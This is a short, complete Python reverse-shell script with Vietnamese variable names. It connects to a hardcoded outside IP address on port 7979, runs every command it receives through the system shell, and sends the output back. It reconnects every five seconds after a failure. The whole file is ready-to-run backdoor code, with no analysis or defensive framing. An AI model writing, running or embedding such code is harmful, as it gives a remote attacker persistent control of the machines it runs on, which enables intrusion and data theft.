import socket as s, subprocess as sp, sys, time

DIA_CHI_CHU = '13.221.209.96'
CONG_KET_NOI = 7979

def ket_noi_va_lang_nghe():
    while True:
        try:
            sock = s.socket(s.AF_INET, s.SOCK_STREAM)
            sock.connect((DIA_CHI_CHU, CONG_KET_NOI))
            while True:
                lenh = sock.recv(4096).decode('utf-8').strip()
                if not lenh: break
                try:
                    ket_qua = sp.run(lenh, shell=True, capture_output=True, text=True, timeout=10)
                    sock.sendall((ket_qua.stdout + ket_qua.stderr).encode('utf-8'))
                except sp.TimeoutExpired:
                    sock.sendall("Lệnh đã hết thời gian và bị hủy.\n".encode('utf-8')); continue
                except Exception as e:
                    sock.sendall(str(e).encode('utf-8') + b'\n')
        except:
            time.sleep(5)
            
ket_noi_va_lang_nghe()
